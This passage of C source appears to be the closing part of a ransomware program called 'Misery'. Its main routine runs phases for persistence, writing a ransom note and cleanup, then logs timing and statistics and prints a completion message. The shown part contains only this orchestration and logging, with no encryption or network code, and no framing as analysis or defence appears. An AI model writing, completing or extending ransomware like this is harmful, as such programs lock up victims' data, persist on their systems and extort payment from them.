    ExecutePhasePeristence();
    ExecutePhaseRansomNote();
    ExecutePhaseCleanup();

    g_misery_ctx.executionTimeMs = GetTickCount() - start_time;

    MiseryLog(MISERY_LOG_INFO, "=== EXECUTION COMPLETE ===");
    MiseryReportStats();
    MiseryCleanupContext();

    MiseryLog(MISERY_LOG_INFO, "Total time: %lu ms", g_misery_ctx.executionTimeMs);
    puts("[+] Done");
    return 0;
}
